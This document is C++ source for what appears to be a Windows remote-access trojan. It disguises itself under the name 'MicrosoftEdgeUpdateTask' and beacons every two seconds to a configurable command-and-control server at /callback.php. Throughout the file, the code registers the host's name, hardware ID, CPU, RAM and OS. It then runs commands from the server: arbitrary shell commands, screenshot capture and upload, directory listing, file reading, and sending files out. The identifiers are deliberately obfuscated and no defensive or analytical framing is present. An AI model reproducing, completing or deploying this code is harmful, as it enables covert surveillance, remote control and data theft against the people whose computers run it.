#include "qa.h"
#include "mt.h"
#include "fb.h"
#include "kz.h"
#include "rw.h"
#include "pd.h"

string yL = "ip";//这里设置服务器
int yM = 8080;//这里是端口
string yK = "/callback.php";
bool yJ = false;

const wchar_t* yR = L"MicrosoftEdgeUpdateTask";

string yN = "";
wstring yO = L"";

ULONG_PTR yP = 0;

static bool zO(const string& jsonResponse) {
    return jsonResponse.find("\"success\":true") != string::npos
        || jsonResponse.find("\"success\": true") != string::npos;
}

static string zP0() {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    string arch = "x86";
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) arch = "x64";
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) arch = "arm64";
    return "Windows/" + arch;
}

static void zQ0(string& out, unsigned int cp) {
    if (cp <= 0x7F) {
        out += (char)cp;
    } else if (cp <= 0x7FF) {
        out += (char)(0xC0 | ((cp >> 6) & 0x1F));
        out += (char)(0x80 | (cp & 0x3F));
    } else if (cp <= 0xFFFF) {
        out += (char)(0xE0 | ((cp >> 12) & 0x0F));
        out += (char)(0x80 | ((cp >> 6) & 0x3F));
        out += (char)(0x80 | (cp & 0x3F));
    } else {
        out += (char)(0xF0 | ((cp >> 18) & 0x07));
        out += (char)(0x80 | ((cp >> 12) & 0x3F));
        out += (char)(0x80 | ((cp >> 6) & 0x3F));
        out += (char)(0x80 | (cp & 0x3F));
    }
}

static int zR0(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return 10 + c - 'a';
    if (c >= 'A' && c <= 'F') return 10 + c - 'A';
    return -1;
}

static string zS0(const string& s) {
    string out;
    out.reserve(s.size());
    for (size_t i = 0; i < s.size(); ++i) {
        char c = s[i];
        if (c != '\\' || i + 1 >= s.size()) {
            out += c;
            continue;
        }
        char n = s[++i];
        switch (n) {
            case '"': out += '"'; break;
            case '\\': out += '\\'; break;
            case '/': out += '/'; break;
            case 'b': out += '\b'; break;
            case 'f': out += '\f'; break;
            case 'n': out += '\n'; break;
            case 'r': out += '\r'; break;
            case 't': out += '\t'; break;
            case 'u': {
                if (i + 4 >= s.size()) { out += 'u'; break; }
                unsigned int cp = 0;
                bool ok = true;
                for (int j = 0; j < 4; ++j) {
                    int v = zR0(s[i + 1 + j]);
                    if (v < 0) { ok = false; break; }
                    cp = (cp << 4) | (unsigned int)v;
                }
                if (ok) {
                    zQ0(out, cp);
                    i += 4;
                } else {
                    out += 'u';
                }
                break;
            }
            default:
                out += n;
                break;
        }
    }
    return out;
}

static size_t zT0(const string& s, size_t start, char openCh, char closeCh) {
    bool inString = false;
    bool escape = false;
    int depth = 0;
    for (size_t i = start; i < s.size(); ++i) {
        char c = s[i];
        if (inString) {
            if (escape) {
                escape = false;
            } else if (c == '\\') {
                escape = true;
            } else if (c == '"') {
                inString = false;
            }
            continue;
        }
        if (c == '"') {
            inString = true;
            continue;
        }
        if (c == openCh) depth++;
        else if (c == closeCh) {
            depth--;
            if (depth == 0) return i;
        }
    }
    return string::npos;
}

static size_t zU0(const string& s, const string& key) {
    return s.find("\"" + key + "\"");
}

static size_t zV0(const string& s, size_t pos) {
    pos = s.find(':', pos);
    if (pos == string::npos) return pos;
    pos++;
    while (pos < s.size() && (s[pos] == ' ' || s[pos] == '\t' || s[pos] == '\r' || s[pos] == '\n')) pos++;
    return pos;
}

static string zW0(const string& s, const string& key) {
    size_t pos = zU0(s, key);
    if (pos == string::npos) return "";
    pos = zV0(s, pos);
    if (pos == string::npos || pos >= s.size() || s[pos] != '"') return "";
    size_t i = pos + 1;
    bool escape = false;
    string raw;
    for (; i < s.size(); ++i) {
        char c = s[i];
        if (escape) {
            raw += '\\';
            raw += c;
            escape = false;
            continue;
        }
        if (c == '\\') {
            escape = true;
            continue;
        }
        if (c == '"') break;
        raw += c;
    }
    return zS0(raw);
}

static string zX0(const string& s, const string& key) {
    size_t pos = zU0(s, key);
    if (pos == string::npos) return "";
    pos = zV0(s, pos);
    if (pos == string::npos || pos >= s.size()) return "";
    if (s[pos] == '{') {
        size_t end = zT0(s, pos, '{', '}');
        if (end == string::npos) return "";
        return s.substr(pos, end - pos + 1);
    }
    if (s[pos] == '[') {
        size_t end = zT0(s, pos, '[', ']');
        if (end == string::npos) return "";
        return s.substr(pos, end - pos + 1);
    }
    size_t end = pos;
    while (end < s.size() && s[end] != ',' && s[end] != '}' && s[end] != ']') end++;
    return s.substr(pos, end - pos);
}

void zD(const string& jsonResponse) {
    size_t pos = jsonResponse.find("\"commands\":");
    if (pos == string::npos) return;
    pos = jsonResponse.find('[', pos);
    if (pos == string::npos) return;
    size_t endPos = zT0(jsonResponse, pos, '[', ']');
    if (endPos == string::npos) return;

    string cmdSection = jsonResponse.substr(pos, endPos - pos + 1);

    size_t i = 0;
    while (i < cmdSection.length()) {
        size_t braceStart = cmdSection.find('{', i);
        if (braceStart == string::npos) break;
        size_t braceEnd = zT0(cmdSection, braceStart, '{', '}');
        if (braceEnd == string::npos) break;

        string cmdJson = cmdSection.substr(braceStart, braceEnd - braceStart + 1);
        i = braceEnd + 1;

        int cmdId = 0;
        string cmdType = zW0(cmdJson, "command");
        string paramsStr = zX0(cmdJson, "params");
        string dataField = zW0(paramsStr, "data");
        string idStr = zX0(cmdJson, "id");
        if (!idStr.empty()) cmdId = atoi(idStr.c_str());

        string result;
        bool resultSent = false;
        if (cmdType == "shell") {
            result = yU(dataField);
            zF(cmdId, result);
            resultSent = true;
        } else if (cmdType == "screenshot") {
            string imgData = zL();
            if (!imgData.empty()) {
                string uploadData = "{\"type\":\"screenshot\",\"client_id\":\"" + yN + "\",\"image\":\"" + imgData + "\"}";
                string uploadResp = hA(yL, yM, yK, uploadData);
                if (zO(uploadResp)) {
                    result = "{\"ok\":true,\"type\":\"screenshot\"}";
                } else {
                    result = "{\"error\":\"screenshot upload failed\"}";
                }
            } else {
                result = "{\"error\":\"screenshot failed\"}";
            }
            zF(cmdId, result);
            resultSent = true;
        } else if (cmdType == "list_dir") {
            result = yT(dataField);
            zF(cmdId, result);
            resultSent = true;
        } else if (cmdType == "read_file") {
            result = zP(dataField, cmdId);
            resultSent = true;
        } else if (cmdType == "download") {
            zN(dataField, cmdId);
            resultSent = true;
        } else if (cmdType == "download_to_server") {
            zA(dataField, cmdId);
            resultSent = true;
        } else {
            result = "{\"error\":\"unknown command type: " + cmdType + "\"}";
            zF(cmdId, result);
            resultSent = true;
        }
        if (!resultSent) {
            result = "{\"error\":\"failed to parse command\"}";
            zF(cmdId, result);
        }
    }
}

class zC {
public:
    zC() : yI0(0), yJ0(0) {}

    void yG() {
        char hostname[256] = {0};
        if (gethostname(hostname, sizeof(hostname)) != 0)
            strcpy_s(hostname, "unknown");

        string cpu = zZ();
        DWORD ram = yE();
        string hwid = zW(hostname, cpu, ram);
        string os = zP0();

        string data = "{\"type\":\"register\",\"hostname\":\"" + zY(hostname) + "\""
            + ",\"hwid\":\"" + hwid + "\""
            + ",\"os_info\":\"" + zY(os) + "\""
            + ",\"cpu_info\":\"" + zY(cpu) + "\""
            + ",\"ram_total\":" + to_string(ram);
        if (!yN.empty())
            data += ",\"client_id\":\"" + yN + "\"";
        data += "}";

        string response = hA(yL, yM, yK, data);
        if (response.empty() || !zO(response)) {
            yJ0++;
            hB("register failed");
            return;
        }
        string clientId = zJ(response);
        if (!clientId.empty()) {
            yN = clientId;
            yJ0 = 0;
            yI0 = 0;
            zD(response);
            hB("register ok: " + yN);
        }
    }

    void yH() {
        if (yN.empty()) {
            yG();
            return;
        }

        yI0++;
        if (yI0 >= 30) {
            hB("periodic re-register");
            yG();
            return;
        }

        string data = "{\"type\":\"heartbeat\",\"client_id\":\"" + yN + "\"}";
        string response = hA(yL, yM, yK, data);

        if (response.empty() || !zO(response)) {
            yJ0++;
            hB("heartbeat failed");
            if (yJ0 >= 3) {
                hB("heartbeat lost, re-register");
                yN.clear();
                yI0 = 0;
                yG();
            }
            return;
        }

        yJ0 = 0;
        if (!response.empty())
            zD(response);
    }

    void wC() {
        yG();
        while (true) {
            try {
                yH();
            } catch (...) {
            }
            Sleep(2000);
        }
    }

private:
    int yI0;
    int yJ0;
};

int rn() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    GdiplusStartupInput gdiStartup;
    GdiplusStartup(&yP, &gdiStartup, NULL);

    yF();

    if (!z0::hD()) {
        return 0;
    }

    zC client;
    client.wC();

    GdiplusShutdown(yP);
    WSACleanup();
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    return rn();
}
